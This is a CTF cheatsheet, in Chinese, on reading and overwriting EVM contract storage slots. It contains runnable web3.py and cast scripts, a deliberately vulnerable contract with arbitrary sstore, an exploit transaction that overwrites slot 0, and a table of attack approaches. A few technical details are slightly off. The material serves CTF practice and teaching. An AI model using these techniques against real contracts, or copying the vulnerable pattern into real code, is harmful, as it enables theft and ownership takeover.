---
title: EVM 存储槽位读取（private 变量 / 任意写）
category: blockchain
tags: [evm, 存储槽, private 变量, 任意写, ctf]
signals: [private 变量, 存储在 slot, isSolved 读 storage, 数组和 mapping, keccak256 槽位, 合约里藏 flag, 读取存储, 覆盖变量, 逆向合约]
difficulty: medium
source: "CTF-Wiki Ethereum Storage / Solidity 文档"
tools: [python, web3py, foundry, cast]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 题目说"flag 藏在合约的 private 变量里"。
- `isSolved()` 判断某个 storage 变量的值（如 `keccak256(seed)` 或某个地址）。
- 合约里 `function read_slot(uint k) public view returns (bytes32)` 之类，提示存储可读。
- 有 `assembly { sstore(...) }` 或数组越界 bug，导致任意写。
- 变量顺序/打包影响 slot 编号 —— 需要手算布局。
- 关键词：storage、slot、private、sload、sstore、Balsn Bank。

## 二、原理

EVM 每个合约有 2^256 个 **32 字节槽**（slot），初始值为 0。**链上数据全部公开**，`private` 只是编译期可见性，`web3.eth.getStorageAt(addr, slot)` 能读任意槽。

布局规则：
- **值类型**（uint、address、bool、bytesN）：按声明顺序从 slot 0 开始占位；小于 32 字节的**打包**（低字节对齐）进同一槽。
- **结构体/数组**：总是从新槽开始。
- **mapping**：声明的槽 `p` 只占位不用；`m[k]` 在 `keccak256(abi.encode(k, p))`。
- **动态数组**：声明槽 `p` 存长度；元素从 `keccak256(p)` 开始，每元素占 `ceil(size/32)` 个槽。
- **`string`/`bytes`**：长度 ≤31 时与数据同槽（低字节存 `len*2`），>31 时主槽存 `len*2+1`，数据在 `keccak256(p)`。

## 三、解题步骤

1. 拿到合约地址与判定条件（`isSolved`）。
2. 手算/用工具算目标变量在哪个 slot。
3. `eth_getStorageAt` 读值（`web3.eth.getStorageAt`）。
4. 若需要"写"：找任意写原语（数组越界、`delegatecall`、`uninitialized storage pointer`）。
5. 读出 flag / 写入满足判定的值。

## 四、可直接运行的脚本

计算槽位并读取（纯 Python）：

```python
from web3 import Web3
from eth_utils import keccak

w3 = Web3(Web3.HTTPProvider("http://TARGET:8545"))
ADDR = "0xCONTRACT"

def slot_of(var_slot_index):
    return w3.eth.get_storage_at(ADDR, var_slot_index).hex()

def mapping_slot(key_int_or_bytes, declared_slot):
    """mapping 的第 key 个元素的槽：keccak256(abi.encode(key, slot))"""
    enc = key_int_or_bytes.to_bytes(32, "big") + declared_slot.to_bytes(32, "big")
    return int.from_bytes(keccak(enc), "big")

def dyn_array_base(declared_slot):
    return int.from_bytes(keccak(declared_slot.to_bytes(32, "big")), "big")

# 示例：contract 里
#   address owner;          slot 0（打包低 20 字节）
#   uint256 randomNumber;   slot 1
#   SafeBox[] safeboxes;    slot 2（长度）
#   mapping(address => FailedAttempt[]) failedLogs;  slot 3
print("slot0:", slot_of(0))                 # owner 在低 20 字节
print("slot1:", slot_of(1))
print("arr len:", slot_of(2))
print("arr[0] base:", hex(dyn_array_base(2)))
print("map slot:", hex(mapping_slot(0x1234, 3)))
```

打包变量的拆解：

```python
def unpack_slot(raw_hex):
    """把 32 字节拆成"从低到高"的字段，配合声明顺序解读"""
    v = int(raw_hex, 16) if isinstance(raw_hex, str) else int.from_bytes(raw_hex, "big")
    addr = "0x%040x" % (v & ((1 << 160) - 1))       # 低 20 字节若是 address
    rest = v >> 160
    return {"address_low20": addr, "rest": hex(rest)}

print(unpack_slot(slot_of(0)))
```

Foundry 版（cast）：

```bash
# 读 slot 0
cast storage 0xCONTRACT 0 --rpc-url http://TARGET:8545

# 读 mapping 槽位（keccak 拼 key+slot）
cast index address 0xUSER 0 | xargs -I{} cast storage 0xCONTRACT {} --rpc-url http://TARGET:8545

# 读动态数组长度与首个元素
cast storage 0xCONTRACT 2 --rpc-url http://TARGET:8545            # 长度
cast keccak 0x0000000000000000000000000000000000000000000000000000000000000002
```

固态存储碰撞（任意写）：

```solidity
// 漏洞：动态数组长度未校验，可越界写
contract Write {
    bytes32 public secret;              // slot 0
    mapping(uint => uint) public data;  // slot 1
    function set(uint idx, uint v) external {
        // 未检查 idx，若底层用 assembly 直接写 slot，就能覆盖 secret
        assembly { sstore(add(0, idx), v) }     // ← 任意写 slot
    }
}
```

```python
# 直接把 slot 0 写成我们想要的值
w3.eth.send_transaction({
    "to": ADDR, "from": acct, "data": w3.keccak(text="set(uint256,uint256)")[:4]
                                   + (0).to_bytes(32, "big") + int("0x" + "ab"*32, 16).to_bytes(32, "big"),
})
print(slot_of(0))
```

`isSolved` 的常见判定：

```solidity
function isSolved() public view returns (bool) {
    return keccak256(abi.encodePacked(flag)) == SECRET;   // 读 SECRET 反推不了，需爆破/假设
}
function isSolved() public view returns (bool) {
    return solved == true;                                 // 写 slot 即可
}
```


## 五、实战：`is_solved` 的两种判定与对应打法

| 判定写法 | 含义 | 打法 |
|---|---|---|
| `solved = true`（storage 变量） | 写一个 bool | 找任意写 / 调用 setter |
| `this.balance == 0` | 掏空合约余额 | 重入 / 未保护 withdraw |
| `keccak256(abi.encode(flag)) == H` | 哈希比对 | 读 H 反推不了，通常 flag 明文就在 storage |
| `balanceOf[player] > 1e30` | 余额门槛 | 溢出 / 重入 |
| `owner == player` | 所有权 | 权限漏洞 / 覆盖 slot 0 |

读哈希型 flag 合约的实战脚本：

```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider("http://TARGET:8545"))
ADDR = "0xCONTRACT"
# 暴力读前 20 个槽，把可打印字节段捞出来
for i in range(20):
    raw = w3.eth.get_storage_at(ADDR, i)
    bs = bytes(raw)
    txt = "".join(chr(b) if 32 <= b < 127 else "." for b in bs).rstrip(".")
    print(i, raw.hex()[:32], "...", txt)
```

> 很多题的 flag 是 `bytes32` 或 `string` 存在槽里：短字符串的低字节是 `len*2`，
> 读出来后 `raw[:len]` 就是明文；长字符串要去 `keccak256(slot)` 指向的位置读。

## 六、常见坑 / 变体

- **打包不是简单拼接**：`address a; uint8 b;` 同槽时 `a` 在低 160 位、`b` 在第 160~167 位。
- **`immutable`/`constant` 变量不在 storage**：它们在字节码里，要读 bytecode 而不是 slot。
- **`keccak256` 的两参数编码**：mapping 用 `abi.encode(key, slot)`（key 若为 address 补 12 字节零），不是直接字符串拼接。
- **`string` 短字符串**：`len*2` 的最低位是标志，读出来要 `& 0xff` 再 `>>1`。
- **合约未部署/selfdestruct**：`eth_getStorageAt` 返回 0（按 EIP-6780，0.8.18+ 只在同交易销毁）。
- 变体：**任意写 → 改 owner**（`sstore(0, attacker)`）。
- 变体：**Balsn CTF 2019 Bank**：数组元素跨槽 + 回调指针覆盖（见 CTF-Wiki 例题）。
- 变体：**XCTF_final 2019 Happy_Double_Eleven** 也是存储读写题型。
- 变体：**`delegatecall` 写槽**（见 `solidity-access-control.md`）。

## 七、参考来源

- [CTF-Wiki Ethereum Storage（含 Balsn Bank、XCTF_final 例题）](https://ctf-wiki.org/blockchain/ethereum/storage/)
- [Solidity 中文文档 - 状态变量储存结构](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)
- [web3.js - web3.eth.getStorageAt](https://web3js.readthedocs.io/en/v1.3.4/web3-eth.html)
- [Foundry - cast storage 文档](https://getfoundry.sh/)
- [Balsn CTF 2019 Bank writeup](https://ctf-wiki.org/blockchain/ethereum/storage/)
